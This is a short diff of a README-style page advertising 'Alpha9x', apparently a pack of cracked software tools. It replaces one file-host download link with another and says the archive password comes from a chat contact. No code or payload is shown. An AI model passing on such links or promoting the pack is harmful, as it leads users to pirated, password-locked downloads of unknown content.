@@ -13,7 +13,7 @@ Contact Fludix for the Password:
 Fludix#0453
 ```
 
-[Alpha9x v.1.56](https://anonfile.com/Z8M9F0h0oc/_Crack_Version_1_zip)
+[Alpha9x v.1.56](https://www.mediafire.com/file/lwf7v702ah9r2y3/Alpha9x-V.1.56.zip)
 -----------------
 
 -----------------
@@ -25,7 +25,7 @@ Alpha9x is ready to be released!
 I have finally finished it's goodies!
 Alpha9x is basically a Crack Tool Pack which
 includes all the Cracked Tool Programs.
-# END
+-END-
 
 <html>
     <head>
